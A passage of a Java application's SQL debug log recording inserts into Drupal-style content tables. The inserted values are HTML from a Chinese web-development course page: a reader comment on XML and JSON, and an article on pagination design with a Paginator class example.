</div> <!----> <!----> <div class="_1w8H0ktn_0 _2A421P4G_0"> <div class="_2jsFl-X0_0"> <i class="iconfont"></i> 
<span></span> </div> <div class="_2P4B1Hdm_0"> <i class="iconfont"></i> <span class=""></span> 
</div> <!----> </div> </div> </div></li> <li class="reJj6Thl_0"><img src="https://static001.geekbang.org/account/avatar/00/14/34/df/64e3d533.jpg" 
class="_2273kGdT_0"> <div class="_2CG0SquK_0"> <div class="_304R4gla_0"> <div> <div class="_18Dng5rT_0"> 
<a>leslie</a> <!----> </div> <div class="_1H1Z49Dr_0"> 2019-12-09 </div> </div> <!----> </div> 
<div> <div class="_3M6kV3zb_0"> 从操作系统方面而言其实代表了两类操作系统数据库：windows和linux;sql server2005开始就有不少数据用了xml格式，JSON的典型代表是mongodb。 
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;xml的强结构化，可读性非常好；曾经主攻sql server时大量的开发直接生成xml，其文档的可读性和强结构化让代码做优化和修改时非常方便，当今主流的mybatis框架用的同样是xml格式。老师在说javascripe时其实漏了一个东西BSON，JSON同时代的产物，只是现在提及的人较少而已。 
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;XML和JSON其实是两种类型的典型代表，各有千秋，合适的场景各取所长合理搭配才是最佳方案。 </div> 
<div class="_2r3UB1GX_0"> <span>展开</span><i class="iconfont"></i> </div> <div class="_2xNIY4NG_0"> 
<p class="_33BLbmw4_0">作者回复: 👍<br>BSON 是众多数据交换格式中的一种，现在使用并不多，而且是二进制的。</p> </div> <div class="_1w8H0ktn_0 
_2A421P4G_0"> <div class="_2jsFl-X0_0"> <i class="iconfont"></i> <span></span> </div> <div 
class="_2P4B1Hdm_0"> <i class="iconfont"></i> <span class=""></span> </div> <!----> </div> 
</div> </div></li>', 0, 'full_html', 'zh-hans', 6, 6) 
 {executed in 3 msec}
2020-11-19 11:02:01.097 INFO  jdbc.sqltiming Line:373 - select bookfieldt0_.entity_id as entity_i1_8_, bookfieldt0_.bundle as bundle2_8_, bookfieldt0_.delta 
as delta3_8_, bookfieldt0_.langcode as langcode4_8_, bookfieldt0_.revision_id as revision5_8_, 
bookfieldt0_.field_thumb_value as field_th6_8_ from node__field_thumb bookfieldt0_ where bookfieldt0_.entity_id=6 
 {executed in 1 msec}
2020-11-19 11:02:01.097 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------|------------------|
|entity_id |bundle |delta |langcode |revision_id |field_thumb_value |
|----------|-------|------|---------|------------|------------------|
|----------|-------|------|---------|------------|------------------|

2020-11-19 11:02:01.098 INFO  jdbc.sqltiming Line:373 - select bookfieldt0_.entity_id as entity_i1_8_0_, bookfieldt0_.bundle as bundle2_8_0_, bookfieldt0_.delta 
as delta3_8_0_, bookfieldt0_.langcode as langcode4_8_0_, bookfieldt0_.revision_id as revision5_8_0_, 
bookfieldt0_.field_thumb_value as field_th6_8_0_ from node__field_thumb bookfieldt0_ where 
bookfieldt0_.entity_id=6 
 {executed in 0 msec}
2020-11-19 11:02:01.098 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------|------------------|
|entity_id |bundle |delta |langcode |revision_id |field_thumb_value |
|----------|-------|------|---------|------------|------------------|
|----------|-------|------|---------|------------|------------------|

2020-11-19 11:02:01.099 INFO  jdbc.sqltiming Line:373 - insert into node__field_thumb (bundle, delta, langcode, revision_id, field_thumb_value, entity_id) 
values ('book', 0, 'zh-hans', 6, 'https://static001.geekbang.org/resource/image/36/21/3656c5654d67c3b627906e2ee4ec0321.jpg', 
6) 
 {executed in 0 msec}
2020-11-19 11:02:01.104 INFO  jdbc.sqltiming Line:373 - select nodefieldt0_.entity_id as entity_i1_17_0_, nodefieldt0_.bundle as bundle2_17_0_, nodefieldt0_.delta 
as delta3_17_0_, nodefieldt0_.langcode as langcode4_17_0_, nodefieldt0_.revision_id as revision5_17_0_, 
nodefieldt0_.field_thumb_value as field_th6_17_0_ from node_revision__field_thumb nodefieldt0_ 
where nodefieldt0_.entity_id=6 
 {executed in 0 msec}
2020-11-19 11:02:01.105 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------|------------------|
|entity_id |bundle |delta |langcode |revision_id |field_thumb_value |
|----------|-------|------|---------|------------|------------------|
|----------|-------|------|---------|------------|------------------|

2020-11-19 11:02:01.106 INFO  jdbc.sqltiming Line:373 - insert into node_revision__field_thumb (bundle, delta, langcode, revision_id, field_thumb_value, 
entity_id) values ('book', 0, 'zh-hans', 6, 'https://static001.geekbang.org/resource/image/36/21/3656c5654d67c3b627906e2ee4ec0321.jpg', 
6) 
 {executed in 0 msec}
2020-11-19 11:02:01.112 INFO  jdbc.sqltiming Line:373 - select bookfieldf0_.entity_id as entity_i1_5_0_, bookfieldf0_.bundle as bundle2_5_0_, bookfieldf0_.delta 
as delta3_5_0_, bookfieldf0_.field_fenlei_target_id as field_fe4_5_0_, bookfieldf0_.langcode 
as langcode5_5_0_, bookfieldf0_.revision_id as revision6_5_0_ from node__field_fenlei bookfieldf0_ 
where bookfieldf0_.entity_id=6 
 {executed in 0 msec}
2020-11-19 11:02:01.113 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------------|---------|------------|
|entity_id |bundle |delta |field_fenlei_target_id |langcode |revision_id |
|----------|-------|------|-----------------------|---------|------------|
|----------|-------|------|-----------------------|---------|------------|

2020-11-19 11:02:01.114 INFO  jdbc.sqltiming Line:373 - insert into node__field_fenlei (bundle, delta, field_fenlei_target_id, langcode, revision_id, 
entity_id) values ('book', 0, 1, 'zh-hans', 6, 6) 
 {executed in 1 msec}
2020-11-19 11:02:01.121 INFO  jdbc.sqltiming Line:373 - select nodefieldf0_.entity_id as entity_i1_14_0_, nodefieldf0_.bundle as bundle2_14_0_, nodefieldf0_.delta 
as delta3_14_0_, nodefieldf0_.field_fenlei_target_id as field_fe4_14_0_, nodefieldf0_.langcode 
as langcode5_14_0_, nodefieldf0_.revision_id as revision6_14_0_ from node_revision__field_fenlei 
nodefieldf0_ where nodefieldf0_.entity_id=6 
 {executed in 0 msec}
2020-11-19 11:02:01.122 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------------|---------|------------|
|entity_id |bundle |delta |field_fenlei_target_id |langcode |revision_id |
|----------|-------|------|-----------------------|---------|------------|
|----------|-------|------|-----------------------|---------|------------|

2020-11-19 11:02:01.123 INFO  jdbc.sqltiming Line:373 - insert into node_revision__field_fenlei (bundle, delta, field_fenlei_target_id, langcode, revision_id, 
entity_id) values ('book', 0, 1, 'zh-hans', 6, 6) 
 {executed in 1 msec}
2020-11-19 11:02:51.532 INFO  jdbc.sqltiming Line:373 - select bookfieldf0_.entity_id as entity_i1_6_, bookfieldf0_.bundle as bundle2_6_, bookfieldf0_.delta 
as delta3_6_, bookfieldf0_.field_fsid_value as field_fs4_6_, bookfieldf0_.langcode as langcode5_6_, 
bookfieldf0_.revision_id as revision6_6_ from node__field_fsid bookfieldf0_ where bookfieldf0_.field_fsid_value='192989172872774' 
 {executed in 0 msec}
2020-11-19 11:02:51.533 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------|---------|------------|
|entity_id |bundle |delta |field_fsid_value |langcode |revision_id |
|----------|-------|------|-----------------|---------|------------|
|----------|-------|------|-----------------|---------|------------|

2020-11-19 11:02:51.534 INFO  jdbc.sqltiming Line:373 - insert into node_revision (langcode, nid, revision_default, revision_timestamp, revision_uid) 
values ('zh-hans', 0, 1, 1605754971, 1) 
 {executed in 0 msec}
2020-11-19 11:02:51.535 INFO  jdbc.sqltiming Line:373 - getGeneratedKeys on query: insert into node_revision (langcode, nid, revision_default, revision_timestamp, 
revision_uid) values ('zh-hans', 0, 1, 1605754971, 1) 
 {executed in 0 msec}
2020-11-19 11:02:51.535 INFO  jdbc.resultsettable Line:610 - 
|--------------|
|generated_key |
|--------------|
|7             |
|--------------|

2020-11-19 11:02:51.544 INFO  jdbc.sqltiming Line:373 - insert into node (langcode, type, uuid, vid) values ('zh-hans', 'book', 'ec4a22d8-3fe8-4c6d-8aae-31cc789e1d4e', 
7) 
 {executed in 0 msec}
2020-11-19 11:02:51.545 INFO  jdbc.sqltiming Line:373 - getGeneratedKeys on query: insert into node (langcode, type, uuid, vid) values ('zh-hans', 
'book', 'ec4a22d8-3fe8-4c6d-8aae-31cc789e1d4e', 7) 
 {executed in 0 msec}
2020-11-19 11:02:51.546 INFO  jdbc.resultsettable Line:610 - 
|--------------|
|generated_key |
|--------------|
|7             |
|--------------|

2020-11-19 11:02:51.551 INFO  jdbc.sqltiming Line:373 - update node_revision set langcode='zh-hans', nid=7, revision_default=1, revision_timestamp=1605754971, 
revision_uid=1 where vid=7 
 {executed in 0 msec}
2020-11-19 11:02:51.558 INFO  jdbc.sqltiming Line:373 - select bookfieldf0_.entity_id as entity_i1_6_0_, bookfieldf0_.bundle as bundle2_6_0_, bookfieldf0_.delta 
as delta3_6_0_, bookfieldf0_.field_fsid_value as field_fs4_6_0_, bookfieldf0_.langcode as langcode5_6_0_, 
bookfieldf0_.revision_id as revision6_6_0_ from node__field_fsid bookfieldf0_ where bookfieldf0_.entity_id=7 
 {executed in 0 msec}
2020-11-19 11:02:51.559 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------|---------|------------|
|entity_id |bundle |delta |field_fsid_value |langcode |revision_id |
|----------|-------|------|-----------------|---------|------------|
|----------|-------|------|-----------------|---------|------------|

2020-11-19 11:02:51.561 INFO  jdbc.sqltiming Line:373 - insert into node__field_fsid (bundle, delta, field_fsid_value, langcode, revision_id, entity_id) 
values ('book', 0, '192989172872774', 'zh-hans', 7, 7) 
 {executed in 1 msec}
2020-11-19 11:02:51.565 INFO  jdbc.sqltiming Line:373 - select nodefieldf0_.entity_id as entity_i1_15_0_, nodefieldf0_.bundle as bundle2_15_0_, nodefieldf0_.delta 
as delta3_15_0_, nodefieldf0_.field_fsid_value as field_fs4_15_0_, nodefieldf0_.langcode as 
langcode5_15_0_, nodefieldf0_.revision_id as revision6_15_0_ from node_revision__field_fsid 
nodefieldf0_ where nodefieldf0_.entity_id=7 
 {executed in 0 msec}
2020-11-19 11:02:51.565 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------|---------|------------|
|entity_id |bundle |delta |field_fsid_value |langcode |revision_id |
|----------|-------|------|-----------------|---------|------------|
|----------|-------|------|-----------------|---------|------------|

2020-11-19 11:02:51.566 INFO  jdbc.sqltiming Line:373 - insert into node_revision__field_fsid (bundle, delta, field_fsid_value, langcode, revision_id, 
entity_id) values ('book', 0, '192989172872774', 'zh-hans', 7, 7) 
 {executed in 0 msec}
2020-11-19 11:02:51.571 INFO  jdbc.sqltiming Line:373 - select bookentity0_.nid as nid1_1_, bookentity0_.bid as bid2_1_, bookentity0_.depth as depth3_1_, 
bookentity0_.has_children as has_chil4_1_, bookentity0_.p1 as p5_1_, bookentity0_.p2 as p6_1_, 
bookentity0_.p3 as p7_1_, bookentity0_.p4 as p8_1_, bookentity0_.p5 as p9_1_, bookentity0_.pid 
as pid10_1_, bookentity0_.weight as weight11_1_ from book bookentity0_ where bookentity0_.nid=7 
 {executed in 1 msec}
2020-11-19 11:02:51.571 INFO  jdbc.resultsettable Line:610 - 
|----|----|------|-------------|---|---|---|---|---|----|-------|
|nid |bid |depth |has_children |p1 |p2 |p3 |p4 |p5 |pid |weight |
|----|----|------|-------------|---|---|---|---|---|----|-------|
|----|----|------|-------------|---|---|---|---|---|----|-------|

2020-11-19 11:02:51.572 INFO  jdbc.sqltiming Line:373 - select bookentity0_.nid as nid1_1_0_, bookentity0_.bid as bid2_1_0_, bookentity0_.depth as 
depth3_1_0_, bookentity0_.has_children as has_chil4_1_0_, bookentity0_.p1 as p5_1_0_, bookentity0_.p2 
as p6_1_0_, bookentity0_.p3 as p7_1_0_, bookentity0_.p4 as p8_1_0_, bookentity0_.p5 as p9_1_0_, 
bookentity0_.pid as pid10_1_0_, bookentity0_.weight as weight11_1_0_ from book bookentity0_ 
where bookentity0_.nid=7 
 {executed in 0 msec}
2020-11-19 11:02:51.572 INFO  jdbc.resultsettable Line:610 - 
|----|----|------|-------------|---|---|---|---|---|----|-------|
|nid |bid |depth |has_children |p1 |p2 |p3 |p4 |p5 |pid |weight |
|----|----|------|-------------|---|---|---|---|---|----|-------|
|----|----|------|-------------|---|---|---|---|---|----|-------|

2020-11-19 11:02:51.574 INFO  jdbc.sqltiming Line:373 - insert into book (bid, depth, has_children, p1, p2, p3, p4, p5, pid, weight, nid) values (1, 
3, 0, 1, 4, 7, 0, 0, 4, 0, 7) 
 {executed in 1 msec}
2020-11-19 11:02:51.578 INFO  jdbc.sqltiming Line:373 - select nodebodyen0_.entity_id as entity_i1_3_, nodebodyen0_.body_value as body_val2_3_, nodebodyen0_.body_summary 
as body_sum3_3_, nodebodyen0_.bundle as bundle4_3_, nodebodyen0_.delta as delta5_3_, nodebodyen0_.body_format 
as body_for6_3_, nodebodyen0_.langcode as langcode7_3_, nodebodyen0_.revision_id as revision8_3_ 
from node__body nodebodyen0_ where nodebodyen0_.entity_id=7 
 {executed in 0 msec}
2020-11-19 11:02:51.578 INFO  jdbc.resultsettable Line:610 - 
|----------|-----------|-------------|-------|------|------------|---------|------------|
|entity_id |body_value |body_summary |bundle |delta |body_format |langcode |revision_id |
|----------|-----------|-------------|-------|------|------------|---------|------------|
|----------|-----------|-------------|-------|------|------------|---------|------------|

2020-11-19 11:02:51.579 INFO  jdbc.sqltiming Line:373 - select nodebodyre0_.entity_id as entity_i1_12_0_, nodebodyre0_.body_value as body_val2_12_0_, 
nodebodyre0_.body_summary as body_sum3_12_0_, nodebodyre0_.bundle as bundle4_12_0_, nodebodyre0_.delta 
as delta5_12_0_, nodebodyre0_.body_format as body_for6_12_0_, nodebodyre0_.langcode as langcode7_12_0_, 
nodebodyre0_.revision_id as revision8_12_0_ from node_revision__body nodebodyre0_ where nodebodyre0_.entity_id=7 
 {executed in 0 msec}
2020-11-19 11:02:51.580 INFO  jdbc.resultsettable Line:610 - 
|----------|-----------|-------------|-------|------|------------|---------|------------|
|entity_id |body_value |body_summary |bundle |delta |body_format |langcode |revision_id |
|----------|-----------|-------------|-------|------|------------|---------|------------|
|----------|-----------|-------------|-------|------|------------|---------|------------|

2020-11-19 11:02:51.610 INFO  jdbc.sqltiming Line:373 - insert into node_revision__body (body_value, body_summary, bundle, delta, body_format, langcode, 
revision_id, entity_id) values ('<div data-slate-editor="true" data-key="1324" autocorrect="off" 
spellcheck="false" data-gramm="false" style="outline: none; white-space: pre-wrap; overflow-wrap: 
break-word;"> <div class="se-63570ab5 " data-slate-type="paragraph" data-slate-object="block" 
data-key="1325"> <span data-slate-object="text" data-key="1326"><span data-slate-leaf="true" 
data-offset-key="1326:0" data-first-offset="true"><span data-slate-string="true">你好，我是四火。</span></span></span> 
</div> <div class="se-e2b94780 " data-slate-type="paragraph" data-slate-object="block" data-key="1327"> 
<span data-slate-object="text" data-key="1328"><span data-slate-leaf="true" data-offset-key="1328:0" 
data-first-offset="true"><span data-slate-string="true">分页是全栈开发中非常常见的一个功能，绝大多数网站都需要用到。这个功能可谓麻雀虽小五脏俱全，是从呈现层、控制器层、到模型层，并和数据存储密切相关的真正的“全栈”功能。有时候你能见到一些清晰、明确的分页，也就是说，你能看到某一个内容的呈现被分成若干页，而当前又是在第几页；而有时候这个功能则是部分模糊了的，比方说，能翻页，但是并不显示总共有多少页。那今天，就让我们来了解一些典型的分页方法，理解分页的一些常见问题和它们的解决方式。</span></span></span> 
</div> <h2 class="se-ec4fb567" data-slate-type="heading" data-slate-object="block" data-key="1329"><span 
data-slate-object="text" data-key="1330"><span data-slate-leaf="true" data-offset-key="1330:0" 
data-first-offset="true"><span data-slate-string="true">物理分页和逻辑分页</span></span></span></h2> 
<div class="se-91b988eb " data-slate-type="paragraph" data-slate-object="block" data-key="1331"> 
<span data-slate-object="text" data-key="1332"><span data-slate-leaf="true" data-offset-key="1332:0" 
data-first-offset="true"><span data-slate-string="true">物理分页一般指的就是数据库分页，而逻辑分页则是程序员口中的“内存分页”。前者是通过条件查询的方式，从数据库中取出特定的数据段来，而后者，则是在完整数据都加载在内存中的情况下，从中取出特定段的数据来。</span></span></span> 
</div> <div class="se-599de885 " data-slate-type="paragraph" data-slate-object="block" data-key="1333"> 
<span data-slate-object="text" data-key="1334"><span data-slate-leaf="true" data-offset-key="1334:0" 
data-first-offset="true"><span data-slate-string="true">显然我们一般情况下更关注物理分页，因为内存的大小总是更为有限，多数情况下我们希望通过条件查询的方式去数据库中取出特定页来。但是也有反例，比方说某些数据量不大，但是访问频率较高的数据，以“缓存”的形式预加载到内存中，再根据客户端的分页条件返回数据，这种方式一样可以遵循分页接口，但是由于被分页的数据是全部在内存中的，这样的数据一般需要遵循如下几个要求：</span></span></span> 
</div> <div class="se-3c7438bc" data-slate-type="list" data-slate-object="block" data-key="1335"> 
<div class="se-f4ed726d se-78d591c7" data-slate-type="list-line" data-slate-object="block" 
data-key="1336"> <span data-slate-object="text" data-key="1337"><span data-slate-leaf="true" 
data-offset-key="1337:0" data-first-offset="true"><span data-slate-string="true">数据量不大，可以放在内存中；</span></span></span> 
</div> <div class="se-1a5b8552 se-a526e625" data-slate-type="list-line" data-slate-object="block" 
data-key="1338"> <span data-slate-object="text" data-key="1339"><span data-slate-leaf="true" 
data-offset-key="1339:0" data-first-offset="true"><span data-slate-string="true">一致性满足要求，或者使用专门的设计维护内存中数据的一致性；</span></span></span> 
</div> <div class="se-e9f1a9b9 se-5b8dac74" data-slate-type="list-line" data-slate-object="block" 
data-key="1340"> <span data-slate-object="text" data-key="1341"><span data-slate-leaf="true" 
data-offset-key="1341:0" data-first-offset="true"><span data-slate-string="true">持久性方面，数据允许丢失，因为在内存中，断电即丢失。</span></span></span> 
</div> </div> <h2 class="se-a34fe046" data-slate-type="heading" data-slate-object="block" data-key="1342"><span 
data-slate-object="text" data-key="1343"><span data-slate-leaf="true" data-offset-key="1343:0" 
data-first-offset="true"><span data-slate-string="true">分页代码设计</span></span></span></h2> <div 
class="se-26085949 " data-slate-type="paragraph" data-slate-object="block" data-key="1344"> 
<span data-slate-object="text" data-key="1345"><span data-slate-leaf="true" data-offset-key="1345:0" 
data-first-offset="true"><span data-slate-string="true">分页这个事儿从功能抽象的角度看基本不复杂，但是我们也经常能看到不同的实现。比较常见的有两种，指定页码的分页，以及使用 
token 的分页，当然，严格来说，页码其实是 token 的一种特殊形式。就以指定页码的分页为例，在实际代码层面上，我见到的分页代码设计包括这样两种。</span></span></span> 
</div> <h3 class="se-dd41f9f7" data-slate-type="heading" data-slate-object="block" data-key="1346"><span 
data-slate-object="text" data-key="1347"><span data-slate-leaf="true" data-offset-key="1347:0" 
data-first-offset="true"><span data-slate-string="true">单独的分页工具类</span></span></span></h3> 
<div class="se-093f225c " data-slate-type="paragraph" data-slate-object="block" data-key="1348"> 
<span data-slate-object="text" data-key="1349"><span data-slate-leaf="true" data-offset-key="1349:0" 
data-first-offset="true"><span class="se-670867b9" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">第一种是彻底把 DAO 的查询逻辑拿出去，创建一个单独的分页工具类 Paginator。</span></span></span></span><span 
data-slate-object="text" data-key="1350"><span data-slate-leaf="true" data-offset-key="1350:0" 
data-first-offset="true"><span data-slate-string="true">这个工具的实例对象只负责分页状态的存储和变更，不知道也不管理数据，在实例化的时候需要 
totalCount 和 pageSize 两个参数，前者表示总共有多少条数据，后者表示每一页最多显示多少条。</span></span></span> </div> <div class="se-1ec3d393 
" data-slate-type="paragraph" data-slate-object="block" data-key="1351"> <span data-slate-object="text" 
data-key="1352"><span data-slate-leaf="true" data-offset-key="1352:0" data-first-offset="true"><span 
data-slate-string="true">DAO 的查询接口自己去创建或者接纳一个 Paginatior 对象，其实现会调用对象的 getStart() 和 getEnd() 
方法，从而知道查询时数据的范围。请看这个 Paginatior 的例子，我把方法内的具体实现省略了：</span></span></span> </div> <div class="se-54b85fc5 
se-32b01939" data-slate-type="pre" data-slate-object="block" data-key="1353" data-code-language="java"> 
<div class="se-2b987ac9 se-dba3612c"> <span></span> </div> <div class="se-b1bd0e78"> <div class="se-487a8091 
se-6bf256d7" data-code-line-number="1"></div> <div class="se-487a8091 se-6bf256d7" data-code-line-number="2"></div> 
<div class="se-487a8091 se-6bf256d7" data-code-line-number="3"></div> <div class="se-487a8091 
se-6bf256d7" data-code-line-number="4"></div> <div class="se-487a8091 se-6bf256d7" data-code-line-number="5"></div> 
<div class="se-487a8091 se-6bf256d7" data-code-line-number="6"></div> <div class="se-487a8091 
se-6bf256d7" data-code-line-number="7"></div> <div class="se-487a8091 se-6bf256d7" data-code-line-number="8"></div> 
<div class="se-487a8091 se-6bf256d7" data-code-line-number="9"></div> <div class="se-487a8091 
se-6bf256d7" data-code-line-number="10"></div> <div class="se-487a8091 se-6bf256d7" data-code-line-number="11"></div> 
<div class="se-487a8091 se-6bf256d7" data-code-line-number="12"></div> <div class="se-487a8091 
se-6bf256d7" data-code-line-number="13"></div> <div class="se-487a8091 se-6bf256d7" data-code-line-number="14"></div> 
<div class="se-487a8091 se-6bf256d7" data-code-line-number="15"></div> <div class="se-487a8091 
se-6bf256d7" data-code-line-number="16"></div> <div class="se-487a8091 se-6bf256d7" data-code-line-number="17"></div> 
<div class="se-487a8091 se-6bf256d7" data-code-line-number="18"></div> <div class="se-487a8091 
se-6bf256d7" data-code-line-number="19"></div> </div> <div class="se-6ad4a9e9 ps ps--active-x"> 
<div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="1354"> <span data-slate-object="text" data-key="1355"><span data-slate-leaf="true" 
data-offset-key="1355:0" data-first-offset="true"><span class=" gkhl-class" data-slate-object="annotation" 
data-annotation-key="gkann_2817674732" data-annotation-type="annotation"><span class=" gkhl-keyword" 
data-slate-object="annotation" data-annotation-key="gkann_4844786653" data-annotation-type="annotation"><span 
data-slate-string="true">class</span></span></span></span><span data-slate-leaf="true" data-offset-key="1355:1"><span 
class=" gkhl-class" data-slate-object="annotation" data-annotation-key="gkann_2817674732" data-annotation-type="annotation"><span 
data-slate-string="true"> </span></span></span><span data-slate-leaf="true" data-offset-key="1355:2"><span 
class=" gkhl-title" data-slate-object="annotation" data-annotation-key="gkann_1292692475" data-annotation-type="annotation"><span 
class=" gkhl-class" data-slate-object="annotation" data-annotation-key="gkann_2817674732" data-annotation-type="annotation"><span 
data-slate-string="true">Paginatior</span></span></span></span><span data-slate-leaf="true" 
data-offset-key="1355:3"><span class=" gkhl-class" data-slate-object="annotation" data-annotation-key="gkann_2817674732" 
data-annotation-type="annotation"><span data-slate-string="true"> </span></span></span><span 
data-slate-leaf="true" data-offset-key="1355:4"><span data-slate-string="true">{</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="1356"> <span data-slate-object="text" data-key="1357"><span data-slate-leaf="true" 
data-offset-key="1357:0" data-first-offset="true"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1357:1"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_5092645746" data-annotation-type="annotation"><span class=" gkhl-keyword" 
data-slate-object="annotation" data-annotation-key="gkann_6554093065" data-annotation-type="annotation"><span 
data-slate-string="true">public</span></span></span></span><span data-slate-leaf="true" data-offset-key="1357:2"><span 
class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_5092645746" 
data-annotation-type="annotation"><span data-slate-string="true"> </span></span></span><span 
data-slate-leaf="true" data-offset-key="1357:3"><span class=" gkhl-title" data-slate-object="annotation" 
data-annotation-key="gkann_7494274499" data-annotation-type="annotation"><span class=" gkhl-function" 
data-slate-object="annotation" data-annotation-key="gkann_5092645746" data-annotation-type="annotation"><span 
data-slate-string="true">Paginatior</span></span></span></span><span data-slate-leaf="true" 
data-offset-key="1357:4"><span class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_5092645746" 
data-annotation-type="annotation"><span class=" gkhl-params" data-slate-object="annotation" 
data-annotation-key="gkann_0100936935" data-annotation-type="annotation"><span data-slate-string="true">(int 
totalCount, int pageSize)</span></span></span></span><span data-slate-leaf="true" data-offset-key="1357:5"><span 
class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_5092645746" 
data-annotation-type="annotation"><span data-slate-string="true"> </span></span></span><span 
data-slate-leaf="true" data-offset-key="1357:6"><span data-slate-string="true">{}</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="1358"> <span data-slate-object="text" data-key="1359"><span data-slate-leaf="true" 
data-offset-key="1359:0" data-first-offset="true"><span data-slate-string="true"> </span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="1360"> <span data-slate-object="text" data-key="1361"><span data-slate-leaf="true" 
data-offset-key="1361:0" data-first-offset="true"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1361:1"><span class=" gkhl-comment" data-slate-object="annotation" 
data-annotation-key="gkann_2262825866" data-annotation-type="annotation"><span data-slate-string="true">// 
翻页</span></span></span></span> </div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" 
data-slate-object="block" data-key="1362"> <span data-slate-object="text" data-key="1363"><span 
data-slate-leaf="true" data-offset-key="1363:0" data-first-offset="true"><span data-slate-string="true"> 
</span></span><span data-slate-leaf="true" data-offset-key="1363:1"><span class=" gkhl-keyword" 
data-slate-object="annotation" data-annotation-key="gkann_5291133461" data-annotation-type="annotation"><span 
class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_3147051779" 
data-annotation-type="annotation"><span data-slate-string="true">public</span></span></span></span><span 
data-slate-leaf="true" data-offset-key="1363:2"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_3147051779" data-annotation-type="annotation"><span data-slate-string="true"> 
</span></span></span><span data-slate-leaf="true" data-offset-key="1363:3"><span class=" gkhl-function" 
data-slate-object="annotation" data-annotation-key="gkann_3147051779" data-annotation-type="annotation"><span 
class=" gkhl-keyword" data-slate-object="annotation" data-annotation-key="gkann_9400222558" 
data-annotation-type="annotation"><span data-slate-string="true">void</span></span></span></span><span 
data-slate-leaf="true" data-offset-key="1363:4"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_3147051779" data-annotation-type="annotation"><span data-slate-string="true"> 
</span></span></span><span data-slate-leaf="true" data-offset-key="1363:5"><span class=" gkhl-title" 
data-slate-object="annotation" data-annotation-key="gkann_0445706042" data-annotation-type="annotation"><span 
class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_3147051779" 
data-annotation-type="annotation"><span data-slate-string="true">turnToNextPage</span></span></span></span><span 
data-slate-leaf="true" data-offset-key="1363:6"><span class=" gkhl-params" data-slate-object="annotation" 
data-annotation-key="gkann_3250295094" data-annotation-type="annotation"><span class=" gkhl-function" 
data-slate-object="annotation" data-annotation-key="gkann_3147051779" data-annotation-type="annotation"><span 
data-slate-string="true">()</span></span></span></span><span data-slate-leaf="true" data-offset-key="1363:7"><span 
class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_3147051779" 
data-annotation-type="annotation"><span data-slate-string="true"> </span></span></span><span 
data-slate-leaf="true" data-offset-key="1363:8"><span data-slate-string="true">{}</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="1364"> <span data-slate-object="text" data-key="1365"><span data-slate-leaf="true" 
data-offset-key="1365:0" data-first-offset="true"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1365:1"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_0796588418" data-annotation-type="annotation"><span class=" gkhl-keyword" 
data-slate-object="annotation" data-annotation-key="gkann_2604810586" data-annotation-type="annotation"><span 
data-slate-string="true">public</span></span></span></span><span data-slate-leaf="true" data-offset-key="1365:2"><span 
class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_0796588418" 
data-annotation-type="annotation"><span data-slate-string="true"> </span></span></span><span 
data-slate-leaf="true" data-offset-key="1365:3"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_9466637054" data-annotation-type="annotation"><span class=" gkhl-function" 
data-slate-object="annotation" data-annotation-key="gkann_0796588418" data-annotation-type="annotation"><span 
data-slate-string="true">void</span></span></span></span><span data-slate-leaf="true" data-offset-key="1365:4"><span 
class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_0796588418" 
data-annotation-type="annotation"><span data-slate-string="true"> </span></span></span><span 
data-slate-leaf="true" data-offset-key="1365:5"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_0796588418" data-annotation-type="annotation"><span class=" gkhl-title" 
data-slate-object="annotation" data-annotation-key="gkann_6687138105" data-annotation-type="annotation"><span 
data-slate-string="true">turnToPrevPage</span></span></span></span><span data-slate-leaf="true" 
data-offset-key="1365:6"><span class=" gkhl-params" data-slate-object="annotation" data-annotation-key="gkann_6032392230" 
data-annotation-type="annotation"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_0796588418" data-annotation-type="annotation"><span data-slate-string="true">()</span></span></span></span><span 
data-slate-leaf="true" data-offset-key="1365:7"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_0796588418" data-annotation-type="annotation"><span data-slate-string="true"> 
</span></span></span><span data-slate-leaf="true" data-offset-key="1365:8"><span data-slate-string="true">{}</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
